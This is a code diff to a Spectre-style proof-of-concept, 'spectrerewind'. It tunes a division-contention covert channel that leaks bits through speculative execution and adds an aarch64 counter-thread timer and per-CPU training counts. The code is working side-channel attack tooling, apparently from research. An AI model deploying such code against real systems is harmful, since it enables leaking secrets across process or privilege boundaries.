@@ -40,6 +40,7 @@
 /**************************************************************************
  * Public Definitions
  **************************************************************************/
+#define N_DIVS 12   // determine speculative execution length
 
 /**************************************************************************
  * Public Types
@@ -52,7 +53,7 @@ typedef struct {
  * Global Variables
  **************************************************************************/
 static int dbg = 1;
-static volatile uint64_t* counter = 0;
+static volatile uint64_t counter = 0;
 static libkdump_config_t config;
 typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
 static pthread_t count_thread;
@@ -86,10 +87,9 @@ static void debug(d_sym_t symbol, const char *fmt, ...) {
 // ---------------------------------------------------------------------------
 #if defined(__aarch64__)
 static inline uint64_t rdtsc() {
-  asm volatile ("DSB SY");	
-  return *counter;
+  asm volatile ("DSB SY");
+  return counter;
 }
-
 #else // !__aarch64__	
 
 static inline uint64_t rdtsc() {
@@ -132,7 +132,19 @@ struct div_test transmit_0;
 struct div_test transmit_1;
 struct div_test transmit;
 
+/* 
+ * micro arch.   minimum # training runs
+ * ------------------------------------
+ * cortex-a72    5
+ * cortex-a57    2
+ * icelake       9
+ * tigerlake     9
+ * all others    7
+ * default       9 (works on all tested platforms)
+ */ 
 struct div_test *test_tasks[] = {
+    &trainer,
+    &trainer,
     &trainer,
     &trainer,
     &trainer,
@@ -148,10 +160,10 @@ struct div_test *test_tasks[] = {
     &trainer,
     &trainer,
     &trainer,
+    &trainer,
+    &trainer,
     &transmit_1,
 };
-
-#define N_DIVS 12   // determine speculative execution length
 
 int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
 {
@@ -170,7 +182,7 @@ int __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
     recv_num /= div;
     // recv_num += 0;
   }
-  if (recv_num == 1) { // trained true, but false when sending
+  if (recv_num == 1.0) { // trained true, but false when sending
     if ( *ptr & (1 << bit_no) ) { // trained false, but true when sending
       for (int x = 0; x < 100; x++) { // generate lots of contention
         send1 /= div;
@@ -207,7 +219,7 @@ static void *countthread(void *dummy) {
   uint64_t local_counter = 0;
   while (1) {
     local_counter++;
-    *counter = local_counter;
+    counter = local_counter;
   }
 }
 
@@ -231,11 +243,6 @@ static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_thre
   transmit_1.div = 1;
   transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
   
-#if defined(__aarch64__)
-  counter = (volatile uint64_t *)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
-  int r = pthread_create(&count_thread, 0, countthread , 0);
-#endif
-
   int n_addr = sizeof(test_tasks)/sizeof(test_tasks[0]);
 
   bw_start = now_in_ns();
@@ -307,6 +314,19 @@ int main(int argc, char *argv[])
   if (setpriority(PRIO_PROCESS, 0, -20) < 0) {
     debug(ERROR, "priority -20 failed\n");
   }
+#if defined(__aarch64__)
+  int r = pthread_create(&count_thread, 0, countthread , 0);
+  if (r != 0) {
+    return -1;
+  }
+  debug(INFO, "%s\n", "Waiting the counter thread...");
+  while(counter == 0) {
+    asm volatile("DSB SY");
+  }
+  debug(INFO, "Done: %ld\n", counter);
+#endif
 
   detect_spectrerewind_threshold();
+
+  return 0;
 }
